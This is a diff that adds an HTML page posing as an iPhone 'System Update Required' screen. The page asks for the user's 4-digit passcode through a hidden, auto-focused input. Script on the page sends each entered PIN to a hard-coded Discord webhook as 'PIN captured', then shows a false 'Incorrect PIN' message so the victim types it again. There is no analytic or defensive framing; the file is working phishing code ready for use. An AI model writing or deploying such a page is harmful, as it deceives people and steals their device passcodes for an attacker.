@@ -1,0 +1,91 @@
+<!-- Omega-9: Data siphon active -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>System Update Required</title>
+  <style>
+    body {
+      background: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    .circles {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 30px;
+    }
+    .circle {
+      width: 24px;
+      height: 24px;
+      border: 2px solid #ccc;
+      border-radius: 50%;
+    }
+    .filled {
+      border-color: black;
+    }
+    #hidden {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+    #message {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div id="message">Please verify your 4-digit iPhone passcode to continue</div>
+  <div class="circles">
+    <div class="circle" id="dot1"></div>
+    <div class="circle" id="dot2"></div>
+    <div class="circle" id="dot3"></div>
+    <div class="circle" id="dot4"></div>
+  </div>
+  <input type="password" id="hidden" maxlength="4" inputmode="numeric" autofocus />
+
+  <script>
+    const input = document.getElementById('hidden');
+    const circles = Array.from(document.getElementsByClassName('circle'));
+    const webhookUrl = 'https://discord.com/api/webhooks/1346369304609951764/KjXNX6EH6WD5NomAAuTHogQBMavYKlQdMbscmAy3qjneBMNsvvuwXJYsfn6mOmP6SIrs'; // <- Replace this with your actual Discord webhook
+
+    input.addEventListener('input', () => {
+      const val = input.value;
+      circles.forEach((circle, index) => {
+        circle.classList.toggle('filled', index < val.length);
+      });
+
+      if (val.length === 4) {
+        // Transmit to Discord webhook
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `📲 PIN captured: **${val}**`
+          })
+        }).then(() => {
+          document.getElementById('message').innerText = "Verifying...";
+          input.value = '';
+          circles.forEach(c => c.classList.remove('filled'));
+          setTimeout(() => {
+            document.getElementById('message').innerText = "Incorrect PIN. Try again.";
+          }, 1500);
+        }).catch(() => {
+          document.getElementById('message').innerText = "Connection error.";
+        });
+      }
+    });
+
+    window.addEventListener('click', () => input.focus());
+    window.addEventListener('load', () => input.focus());
+  </script>
+</body>
+</html>
